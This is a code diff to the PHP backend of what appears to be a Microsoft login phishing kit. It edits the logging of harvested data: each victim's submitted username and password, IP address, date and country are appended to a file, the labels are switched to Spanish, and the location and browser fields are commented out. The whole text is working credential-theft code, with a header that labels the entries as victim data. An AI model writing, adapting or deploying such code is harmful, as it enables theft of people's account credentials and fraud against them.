@@ -111,17 +111,17 @@ $city     = $json['city'];
 
 
 
-file_put_contents($file, print_r("\nMICROSOFT VICTIM DATA => Informations \n", true), FILE_APPEND);
+// file_put_contents($file, print_r("\nMICROSOFT VICTIM DATA => Informations \n", true), FILE_APPEND);
 file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
+file_put_contents($file, "Usuario: " . $_POST['loginfmt'] . "\n", FILE_APPEND);
+file_put_contents($file, "Clave: " . $_POST['passwd'] . "\n", FILE_APPEND);
+file_put_contents($file, print_r("Tiempo: $full_date \n", true), FILE_APPEND);
+file_put_contents($file, print_r("Pais: $country \n", true), FILE_APPEND);
 file_put_contents($file, print_r("IP: $ip \n", true), FILE_APPEND);
-file_put_contents($file, print_r("Full-Date: $full_date \n", true), FILE_APPEND);
-file_put_contents($file, print_r("Country: $country \n", true), FILE_APPEND);
-file_put_contents($file, print_r("Region: $region \n", true), FILE_APPEND);
-file_put_contents($file, print_r("City: $city \n", true), FILE_APPEND);
-file_put_contents($file, print_r("User-Agent: $browser \n", true), FILE_APPEND);
-file_put_contents($file, print_r("OS-System: $os_system \n", true), FILE_APPEND);
-file_put_contents($file, "Username: " . $_POST['loginfmt'] . "\n", FILE_APPEND);
-file_put_contents($file, "Password: " . $_POST['passwd'] . "\n", FILE_APPEND);
+// file_put_contents($file, print_r("Region: $region \n", true), FILE_APPEND);
+// file_put_contents($file, print_r("City: $city \n", true), FILE_APPEND);
+// file_put_contents($file, print_r("User-Agent: $browser \n", true), FILE_APPEND);
+// file_put_contents($file, print_r("OS-System: $os_system \n", true), FILE_APPEND);
 file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
 file_put_contents($file, print_r("\n", true), FILE_APPEND);
 
